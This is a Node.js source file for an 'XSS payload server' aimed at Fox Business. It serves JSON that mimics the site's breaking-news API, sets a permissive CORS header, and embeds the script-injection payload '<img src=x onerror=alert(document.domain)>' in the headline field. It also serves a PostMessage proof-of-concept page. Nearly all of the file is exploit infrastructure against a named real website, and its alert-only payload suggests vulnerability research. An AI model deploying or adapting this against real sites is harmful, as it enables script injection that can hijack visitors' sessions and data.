/**
 * XSS payload server - serves JSON with permissive CORS + Fox Business PostMessage PoC.
 * Use with ngrok, or deploy to Vercel/Render/Railway for a public HTTPS URL.
 */

const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 3000;
const PUBLIC_DIR = path.join(__dirname, 'public');

// JSON payload matching Fox Business Spark API format for breaking-news.js
const jsonPayload = {
  data: {
    status: { success: true, code: 200 },
    existing_total: 1,
    results: [{
      publication_date: new Date().toISOString(),
      eyebrow: '',
      'main-content': [{
        component: 'BreakingNews',
        model: {
          url: 'https://www.foxbusiness.com/markets',
          headline: '<img src=x onerror=alert(document.domain)>',
          bannerType: 'BreakingNews'
        }
      }]
    }]
  }
};

const server = http.createServer((req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  // Parse URL without query string
  const urlPath = req.url.split('?')[0];

  // Serve JSON payload on multiple routes for compatibility
  if (urlPath === '/' || urlPath === '/payload.json' || urlPath === '/vercel.json' || urlPath === '/breaking.json') {
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Cache-Control', 'no-cache, no-store');
    res.writeHead(200);
    res.end(JSON.stringify(jsonPayload));
    return;
  }

  // Static file from public/ (e.g. Fox Business PostMessage PoC)
  const safePath = path.normalize(req.url).replace(/^(\.\.(\/|\\|$))+/, '');
  const filePath = path.join(PUBLIC_DIR, safePath);
  if (!filePath.startsWith(PUBLIC_DIR)) {
    res.writeHead(403);
    res.end();
    return;
  }
  fs.readFile(filePath, (err, data) => {
    if (err) {
      res.writeHead(404);
      res.end();
      return;
    }
    const ext = path.extname(filePath);
    const types = { '.html': 'text/html', '.json': 'application/json', '.js': 'application/javascript' };
    res.setHeader('Content-Type', types[ext] || 'application/octet-stream');
    res.writeHead(200);
    res.end(data);
  });
});

server.listen(PORT, () => {
  console.log(`XSS payload server on http://localhost:${PORT}`);
  console.log('  JSON payload:     / or /payload.json');
  console.log('  Fox PostMessage:  /foxbusiness-postmessage-poc.html');
});
